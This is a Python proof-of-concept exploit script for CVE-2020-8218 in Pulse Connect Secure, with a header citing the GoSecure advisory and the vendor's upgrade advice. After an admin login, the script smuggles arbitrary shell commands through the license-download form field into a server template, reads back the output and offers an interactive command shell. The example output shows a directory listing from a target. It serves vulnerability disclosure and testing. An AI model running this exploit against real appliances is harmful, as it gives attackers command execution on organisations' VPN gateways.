"""
# pulse-gosecure-rce

          _____                    _____                    _____            _____                    _____
         /\    \                  /\    \                  /\    \          /\    \                  /\    \
        /::\    \                /::\____\                /::\____\        /::\    \                /::\    \
       /::::\    \              /:::/    /               /:::/    /       /::::\    \              /::::\    \
      /::::::\    \            /:::/    /               /:::/    /       /::::::\    \            /::::::\    \
     /:::/\:::\    \          /:::/    /               /:::/    /       /:::/\:::\    \          /:::/\:::\    \
    /:::/__\:::\    \        /:::/    /               /:::/    /       /:::/__\:::\    \        /:::/__\:::\    \
   /::::\   \:::\    \      /:::/    /               /:::/    /        \:::\   \:::\    \      /::::\   \:::\    \
  /::::::\   \:::\    \    /:::/    /      _____    /:::/    /       ___\:::\   \:::\    \    /::::::\   \:::\    \
 /:::/\:::\   \:::\____\  /:::/____/      /\    \  /:::/    /       /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \
/:::/  \:::\   \:::|    ||:::|    /      /::\____\/:::/____/       /::\   \:::\   \:::\____\/:::/__\:::\   \:::\____\
\::/    \:::\  /:::|____||:::|____\     /:::/    /\:::\    \       \:::\   \:::\   \::/    /\:::\   \:::\   \::/    /
 \/_____/\:::\/:::/    /  \:::\    \   /:::/    /  \:::\    \       \:::\   \:::\   \/____/  \:::\   \:::\   \/____/
          \::::::/    /    \:::\    \ /:::/    /    \:::\    \       \:::\   \:::\    \       \:::\   \:::\    \
           \::::/    /      \:::\    /:::/    /      \:::\    \       \:::\   \:::\____\       \:::\   \:::\____\
            \::/____/        \:::\__/:::/    /        \:::\    \       \:::\  /:::/    /        \:::\   \::/    /
             ~~               \::::::::/    /          \:::\    \       \:::\/:::/    /          \:::\   \/____/
                               \::::::/    /            \:::\    \       \::::::/    /            \:::\    \
                                \::::/    /              \:::\____\       \::::/    /              \:::\____\
                                 \::/____/                \::/    /        \::/    /                \::/    /
                                  ~~                       \/____/          \/____/                  \/____/

## About
Proof of concept tool to test for the existence of Pulse Secure RCE (CVE-2020-8218). This tool was built around the POC from the GoSecure advisory (see refs). All credit to them for the finding.

As recommended by Pulse Secure:
"The solution for these vulnerabilities is to upgrade the Pulse Connect Secure and Pulse Policy Secure server software version to the 9.1R8. This following PCS/PPS version can be downloaded from https://my.pulsesecure.net."

Refs:
* https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44516/?kA23Z000000L6i5SAC
* https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/

Example usage:
withdk@hogwarts source % python pulse-gosecure-rce.py -u https://192.168.1.120 --user admin --password mypassword
[*] Successfully logged in
(Cmd) ls /
[*] Sending cmd ls /
[*] Sending exploit...
[*] Getting output...
******************************************
2.6.32.358-x86_64
bin
boot
cgroups
data
dev
etc
home
lib
lib64
modules
opt
pkg
proc
runtime
sbin
sys
tmp
usr
va
var
webserver

******************************************
(Cmd) exit
Bye
[*] Getting logout URL
[*] Sending logout URL
[*] Successfully logged out.

DK @withdk
https://github.com/withdk/pulse-gosecure-rce-poc/blob/master/README.md

## Disclaimer
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import argparse
import urllib3
import requests
import ssl
import re
#from requests_toolbelt.utils import dump # debugging
import time
from cmd import Cmd

LOGOUTLINK = r"logout.cgi\?xsauth=([\d+\w+]+)" # /dana-na/auth/logout.cgi?xsauth=271e264f539bfdb1e342eeb3dd4b45be
PFAILED = "p=failed" # welcome.cgi?p=failed
PLOGOUT = "p=logout" # welcome.cgi?p=logout
PADMINCONFIRM = "p=admin-confirm" #welcome.cgi?p=admin-confirm

class MyShell(Cmd):
    """ For interactive shell """
    def do_exit(self, inp):
        print("Bye")
        return True
    def default(self, inp):
        print(f"[*] Sending cmd {inp}")
        do_exploit(inp)

def do_exploit(cmd):
    """ The actual exploit code """
    print("[*] Sending exploit...")
    url=URL + "/dana-admin/license/downloadlicenses.cgi"
    payload = {
        "cmd":"download",
        "preferredNetwork":"internal",
        #"txtVLSAuthCode" : "gotcha2"
        "txtVLSAuthCode":"gotcha -n '($x=\"" + cmd + "\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc"
    }
    r = do_post(url, payload)

    print("[*] Getting output...")
    url=URL + "/dana-na/auth/setcookie.cgi"
    r = do_get(url, None)
    do_pretty_output(r)

def do_pretty_output(r):
    """ # TODO: a big hack to strip out garbage (alpha:) """
    print("******************************************")
    print(f"{r.text[0:-696]}") # quick hack, static output so should work.
    print("******************************************")

def do_login():
    """ Admin authentication bit """
    url = URL + "/dana-na/auth/url_admin/login.cgi"
    payload = {
        "tz_offset":180,
        "username":USER,
        "password":PASS,
        "realm":"Admin Users",
        "btnSubmit":"Sign In"
        }
    r = do_post(url, payload)

    if(check_failed_login(r)) == False:
        print("[*] Successfully logged in")
        if(check_failed_confirm(r)):
            print("[*] Admin already logged in, please manually login and logout.")
            exit()
        else:
            return(True)
    else:
        print("[*] Failed login. Exiting...")
        exit()


def do_logout():
    """ Logout cleanly """
    print("[*] Getting logout URL")
    url=URL + "/dana-admin/misc/admin.cgi"
    payload=None
    r = do_get(url, None)

    logoutlink = check_failed_logoutlink(r)
    if(logoutlink == None):
        print("[*] Error getting logoutlink. Exiting...")
        exit()

    print("[*] Sending logout URL")
    url=URL + "/dana-na/auth/logout.cgi"
    payload={"xsauth":logoutlink}
    r = do_get(url, payload)
    if(check_failed_logout(r)):
        print("[*] Successfully logged out.")
    else:
        print("[*] Failed to logout.")

def do_post(url, payload):
    """ HTTP POST handler """
    r = s.post(
        url,
        data=payload,
        verify=False
    )
    return(r)

def do_get(url, payload):
    """ HTTP GET Handler """
    if(payload==None):
        r = s.get(
                url,
                verify=False
        )
        return(r)
    else:
        r = s.get(
                url,
                params=payload,
                verify=False
        )
        return(r)

def check_failed_login(r):
    #print(dump.dump_all(r)) # debugging
    if(re.search("p=failed", r.url)):
        return(True)
    else:
        return(False)

def check_failed_logout(r):
    #print(dump.dump_all(r)) # debugging
    if(re.search("p=logout", r.url)):
        return(True)
    else:
        return(False)

def check_failed_confirm(r):
    #print(dump.dump_all(r)) # debugging
    if(re.search("p=admin-confirm", r.url)):
        return(True)
    else:
        return(False)

def check_failed_logoutlink(r):
    logoutlink = re.search(LOGOUTLINK, r.text)
    if(logoutlink.group(1)):
        return(logoutlink.group(1))
    else:
        return(None)

def main():
    global args, s, URL, CMD, USER, PASS
    debug=0

    parser=argparse.ArgumentParser(description='CVE-2020-8218 Pulse Secure RCE Proof of Concept')
    parser.add_argument('-v', '--verbose', '--debug', action='store_true')
    parser.add_argument('-u','--url', required=True, help='https://svr')
    parser.add_argument('--username', required=True, help='administrator username')
    parser.add_argument('--password', required=True, help='administrator password')
    #parser.add_argument('-c','--cmd', required=True, help='ls /')
    #parser.add_argument('-i','--interactive', required=False, help='shell')
    #parser.add_argument('-p','--proxy', help='e.g. 127.0.0.1:8080')
    #parser.add_argument('-ua','--useragent')
    args=parser.parse_args()

    if args.verbose:
        debug=True

    URL=args.url
    USER=args.username
    PASS=args.password
    #CMD=args.cmd
    #INT=args.interactive

    s = requests.Session()
    do_login()
    MyShell().cmdloop()
    #do_exploit()
    do_logout()
    print("")

if __name__ == "__main__":
	main()
